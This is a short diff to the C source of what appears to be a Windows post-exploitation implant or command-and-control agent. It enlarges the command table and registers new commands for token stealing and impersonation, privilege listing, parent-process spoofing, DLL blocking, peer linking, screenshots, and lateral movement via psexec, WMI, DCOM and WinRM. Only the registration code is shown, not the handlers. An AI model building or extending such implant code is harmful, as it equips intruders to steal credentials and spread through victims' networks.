@@ -2,7 +2,7 @@
 #include "config.h"
 #include "common.h"
 
-#define MAX_COMMANDS 31
+#define MAX_COMMANDS 64
 
 static COMMAND_ENTRY g_commands[MAX_COMMANDS];
 static DWORD g_command_count = 0;
@@ -94,6 +94,54 @@ VOID register_commands(PINSTANCE inst) {
 #endif
 #ifdef INCLUDE_CMD_POWERPICK
     _register(XSTR("powerpick"), cmd_powerpick);
+#endif
+#ifdef INCLUDE_CMD_SCREENSHOT
+    _register(XSTR("screenshot"), cmd_screenshot);
+#endif
+#ifdef INCLUDE_CMD_RUN
+    _register(XSTR("run"), cmd_run);
+#endif
+#ifdef INCLUDE_CMD_EXECUTE
+    _register(XSTR("execute"), cmd_execute);
+#endif
+#ifdef INCLUDE_CMD_MAKE_TOKEN
+    _register(XSTR("make_token"), cmd_make_token);
+#endif
+#ifdef INCLUDE_CMD_STEAL_TOKEN
+    _register(XSTR("steal_token"), cmd_steal_token);
+#endif
+#ifdef INCLUDE_CMD_REV2SELF
+    _register(XSTR("rev2self"), cmd_rev2self);
+#endif
+#ifdef INCLUDE_CMD_GETPRIVS
+    _register(XSTR("getprivs"), cmd_getprivs);
+#endif
+#ifdef INCLUDE_CMD_PPID
+    _register(XSTR("ppid"), cmd_ppid);
+#endif
+#ifdef INCLUDE_CMD_BLOCKDLLS
+    _register(XSTR("blockdlls"), cmd_blockdlls);
+#endif
+#ifdef INCLUDE_CMD_LINK
+    _register(XSTR("link"), cmd_link);
+#endif
+#ifdef INCLUDE_CMD_UNLINK
+    _register(XSTR("unlink"), cmd_unlink);
+#endif
+#ifdef INCLUDE_CMD_PSEXEC
+    _register(XSTR("psexec"), cmd_psexec);
+#endif
+#ifdef INCLUDE_CMD_PSEXEC_PSH
+    _register(XSTR("psexec_psh"), cmd_psexec_psh);
+#endif
+#ifdef INCLUDE_CMD_WMIEXEC
+    _register(XSTR("wmiexec"), cmd_wmiexec);
+#endif
+#ifdef INCLUDE_CMD_DCOMEXEC
+    _register(XSTR("dcomexec"), cmd_dcomexec);
+#endif
+#ifdef INCLUDE_CMD_WINRM
+    _register(XSTR("winrm"), cmd_winrm);
 #endif
 }
 
